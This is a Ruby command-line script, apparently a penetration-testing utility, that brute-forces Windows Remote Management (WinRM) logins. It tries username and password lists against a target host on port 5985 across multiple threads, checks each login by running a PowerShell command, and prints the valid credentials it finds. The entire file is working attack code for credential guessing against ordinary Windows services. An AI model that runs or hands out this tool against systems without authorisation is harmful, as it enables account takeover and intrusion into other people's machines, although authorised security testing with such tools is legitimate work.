#!/usr/bin/env ruby
#  Copyright 2020 M. Choji
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

require 'optparse'
require 'ostruct'
require 'winrm'
require 'thread'

# Extends string class with colorized output
class String
  # colorization
  def colorize(color_code)
    "\e[#{color_code}m#{self}\e[0m"
  end

  def red
    colorize(31)
  end

  def green
    colorize(32)
  end

  def yellow
    colorize(33)
  end

  def blue
    colorize(34)
  end

  def pink
    colorize(35)
  end

  def light_blue
    colorize(36)
  end
end

# Try to login and run a simple command
def try_login(config)
  conn = WinRM::Connection.new(config)
  #conn.logger.level = :debug
  begin
    conn.shell(:powershell) do |shell|
      output = shell.run('$PSVersionTable') do |stdout, stderr|
        #STDOUT.print stdout
        #STDERR.print stderr
      end
      #puts "The script exited with exit code #{output.exitcode}"
    end
  # Silently ignore authorization error
  rescue WinRM::WinRMAuthorizationError
  # Catch all other exceptions
  rescue => e
    puts "Caught exception #{e}: #{e.message}"
  # No exception means success
  else
    return {:user => config[:user], :password => config[:password]}
  end
  return nil
end

# Print a message to show login attempt
def print_attempt(config, quiet)
  # Use mutex to prevent output garbling when threading
  $stdout_mutex.synchronize do
    puts "Trying #{config[:user]}:#{config[:password]}" unless quiet
  end
end

# Print valid credentials
def check_creds(credentials)
  if credentials
    $stdout_mutex.synchronize do
      puts "[SUCCESS] user: #{credentials[:user]} password: #{credentials[:password]}".green
    end
    # Add successful credentials to our shared array
    $successful_creds_mutex.synchronize do
      $successful_creds << credentials
    end
  end
end

# Initialize mutexes for thread safety
$stdout_mutex = Mutex.new
$successful_creds_mutex = Mutex.new
$successful_creds = []
$thread_count_mutex = Mutex.new
$active_threads = 0

# Function to process a single credential pair
def process_credential(auth, quiet)
  print_attempt(auth, quiet)
  check_creds(try_login(auth))
end

# Set a trap to avoid error messages on Ctrl+C
trap "SIGINT" do
  $stdout_mutex.synchronize do
    STDERR.puts "Execution interrupted by user"
  end
  exit 130
end

options = OpenStruct.new
options.uri = "/wsman"
options.port = "5985"
options.timeout = 1
options.threads = 10 # Default number of threads

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: winrm-brute.rb [options]"
  opts.banner += " HOST"

  opts.on("-u USER",
          "A specific username to authenticate as") do |user|
    options.user = user
  end

  opts.on("-U USERFILE",
          "File containing usernames, one per line") do |userfile|
    options.userfile = userfile
  end

  opts.on("-p PASSWORD",
          "A specific password to authenticate with") do |passwd|
    options.passwd = passwd
  end

  opts.on("-P PASSWORDFILE",
          "File containing passwords, one per line") do |passwdfile|
    options.passwdfile = passwdfile
  end

  opts.on("-t TIMEOUT",
          "Timeout for each attempt, in seconds (default: 1)") do |timeout|
    options.timeout = timeout
  end

  opts.on("-T THREADS",
          "Number of threads to use (default: 10)") do |threads|
    options.threads = threads.to_i
  end

  opts.on("-q", "--quiet",
          "Do not write all login attempts") do |quiet|
    options.quiet = quiet
  end

  opts.on("--port=PORT",
          "The target TCP port (default: 5985)") do |port|
    options.port = port
  end

  opts.on("--uri=URI",
          "The URI of the WinRM service (default: /wsman)") do |uri|
    options.uri = uri
  end

  opts.on_tail("-h", "--help", "Show this message") do
    puts opts
    exit
  end
end

# If no arguments are given, show help
if ARGV.empty?
  puts optparse
  exit
end

optparse.parse!

# Check if some username was given
if not (options.user or options.userfile)
  puts "You must define at least one of -u or -U options".red
  puts optparse
  exit(-1)
end

# Check if some password was given
if not (options.passwd or options.passwdfile)
  puts "You must define at least one of -p or -P options".red
  puts optparse
  exit(-1)
end

# Check if host was provided
if ARGV.empty?
  puts "You must specify a target host!".red
  puts optparse
  exit(-1)
end
target = ARGV.pop

# Define general authentication options
auth = {
  endpoint:  "http://#{target}:#{options.port}#{options.uri}",
  operation_timeout: options.timeout,
  receive_timeout: options.timeout + 2,
  retry_limit: 1
}

# Create a thread pool
thread_pool = Queue.new

# Function to manage threads
def thread_manager(thread_pool, max_threads)
  loop do
    # Break if no more work and no active threads
    if thread_pool.empty? && $active_threads == 0
      break
    end
    
    # If we have capacity and work to do, start a new thread
    if $active_threads < max_threads && !thread_pool.empty?
      $thread_count_mutex.synchronize { $active_threads += 1 }
      
      # Get the next credential to process
      credential = thread_pool.pop
      
      Thread.new do
        begin
          process_credential(credential[:auth], credential[:quiet])
        rescue => e
          $stdout_mutex.synchronize do
            puts "Thread error: #{e.message}".red
          end
        ensure
          # Decrement thread count when done
          $thread_count_mutex.synchronize { $active_threads -= 1 }
        end
      end
    end
    
    # Small sleep to prevent CPU hogging
    sleep 0.1
  end
end

# Function to queue credential attempts
def queue_credential(thread_pool, auth, quiet)
  thread_pool << { auth: auth.dup, quiet: quiet }
end

# Generate all credential pairs and add to queue
if options.user
  auth[:user] = options.user
  if options.passwd
    auth[:password] = options.passwd
    queue_credential(thread_pool, auth, options.quiet)
  end
  if options.passwdfile
    File.readlines(options.passwdfile, chomp: true).each do |p|
      auth[:password] = p
      queue_credential(thread_pool, auth, options.quiet)
    end
  end
end

if options.userfile
  File.readlines(options.userfile, chomp: true).each do |user|
    auth[:user] = user
    if options.passwd
      auth[:password] = options.passwd
      queue_credential(thread_pool, auth, options.quiet)
    end
    if options.passwdfile
      File.readlines(options.passwdfile, chomp: true).each do |passwd|
        auth[:password] = passwd
        queue_credential(thread_pool, auth, options.quiet)
      end
    end
  end
end

# Start the thread manager
puts "Starting bruteforce with #{options.threads} threads...".blue
thread_manager(thread_pool, options.threads)

# Summary of results
if $successful_creds.empty?
  puts "No valid credentials found.".yellow
else
  puts "\nSummary of valid credentials:".blue
  $successful_creds.each do |cred|
    puts "User: #{cred[:user]} | Password: #{cred[:password]}".green
  end
end
